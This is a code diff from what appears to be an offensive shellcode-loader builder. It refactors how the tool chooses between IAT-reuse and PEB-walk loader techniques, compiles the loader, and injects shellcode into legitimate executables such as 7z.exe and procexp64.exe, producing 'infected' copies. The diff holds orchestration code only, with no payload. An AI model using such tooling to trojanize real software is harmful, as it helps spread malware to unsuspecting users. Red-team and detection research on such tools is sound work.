@@ -81,23 +81,20 @@ def main():
         project.try_start_final_shellcode = False
 
         if args.verify == "peb":
-            project.source_style = SourceStyle.peb_walk
+            project.inject = True
+            project.inject_mode = "1,1"
+            project.inject_exe_in = "exes/7z.exe"
+            project.inject_exe_out = "out/7z-verify.exe"
+        elif args.verify == "iat":
             project.inject = True
             project.inject_mode = "1,1"
             project.inject_exe_in = "exes/procexp64.exe"
-            project.inject_exe_out = "out/procexp64-a.exe"
-        elif args.verify == "iat":
-            project.source_style = SourceStyle.iat_reuse
-            project.inject = True
-            project.inject_mode = "1,1"
-            project.inject_exe_in = "exes/iattest-full.exe"
-            project.inject_exe_out = "out/iatttest-full-a.exe"
+            project.inject_exe_out = "out/procexp64-verify.exe"
         elif args.verify == "rwx":
-            project.source_style = SourceStyle.peb_walk
             project.inject = True
             project.inject_mode = "1,1"
             project.inject_exe_in = "exes/wifiinfoview.exe"
-            project.inject_exe_out = "out/wifiinfoview.exe-a.exe"
+            project.inject_exe_out = "out/wifiinfoview.exe-verify.exe"
 
         else:
             logger.info("Unknown verify option {}, use std/iat".format(args.verify))
@@ -139,35 +136,50 @@ def start():
 
     # Load our input
     project.load_payload()
-    project.load_injectable([
-        "GetEnvironmentVariableW",
-        "VirtualAlloc"
-    ])
-    project.exe_info.print()
+    project.load_injectable()
 
-    # choose which source / technique we gonna use
-    if project.exe_info.has_all():
-        project.source_style = SourceStyle.iat_reuse
-    else:
-        logger.info("--[ Some imports are missing for the shellcode to use IAT_REUSE")
-        project.source_style = SourceStyle.peb_walk
-    logger.warning("--[ SourceStyle: {}".format(project.source_style.name))
-
-    # Copy: loader C files into working directory: build/
+    # Copy: IAT_REUSE loader C files into working directory: build/
     phases.templater.create_c_from_template(
-        source_style = project.source_style,
+        source_style = SourceStyle.iat_reuse,
         alloc_style  = project.alloc_style,
         exec_style   = project.exec_style,
         decoder_style= project.decoder_style,
     )
-
-    # Compile: C -> ASM
+    # Compile: IAT_REUSE loader C -> ASM
     if project.generate_asm_from_c:
         phases.compiler.compile(
             c_in = main_c_file, 
             asm_out = main_asm_file, 
             payload_len = len(project.payload_data), 
             exe_info = project.exe_info)
+        
+    # Decide if we can use IAT_REUSE (all function calls available as import)
+    required_functions = phases.compiler.get_function_stubs(main_asm_file)
+    if project.exe_info.has_all_functions(required_functions):
+        project.source_style = SourceStyle.iat_reuse
+        logger.warning("--[ SourceStyle: Using IAT_REUSE".format())
+        # all good, patch ASM
+        phases.compiler.fixup_iat_reuse(main_asm_file, project.exe_info)
+    else:
+        # Not good, Fall back to PEB_WALK
+        project.source_style = SourceStyle.peb_walk
+        logger.warning("--[ SourceStyle: Fall back to PEB_WALK".format())
+
+        clean_files()
+        # Copy: PEB_WALK loader C files into working directory: build/
+        phases.templater.create_c_from_template(
+            source_style = SourceStyle.peb_walk,
+            alloc_style  = project.alloc_style,
+            exec_style   = project.exec_style,
+            decoder_style= project.decoder_style,
+        )
+        # Compile: PEB_WALK C -> ASM
+        if project.generate_asm_from_c:
+            phases.compiler.compile(
+                c_in = main_c_file, 
+                asm_out = main_asm_file, 
+                payload_len = len(project.payload_data), 
+                exe_info = project.exe_info)
 
     # Assemble: ASM -> Shellcode
     if project.generate_shc_from_asm:
@@ -216,9 +228,11 @@ def start():
         phases.injector.inject_exe(
             shellcode_in = main_shc_file,
             exe_in = project.inject_exe_in,
-            exe_out = project.inject_exe_out,
-            exe_info = project.exe_info
+            exe_out = project.inject_exe_out
         )
+        if project.source_style == SourceStyle.iat_reuse:
+            phases.injector.injected_fix_iat(project.inject_exe_out, project.exe_info)
+
         if project.verify:
             logger.info("--[ Verify infected exe")
             exit_code = phases.injector.verify_injected_exe(project.inject_exe_out)
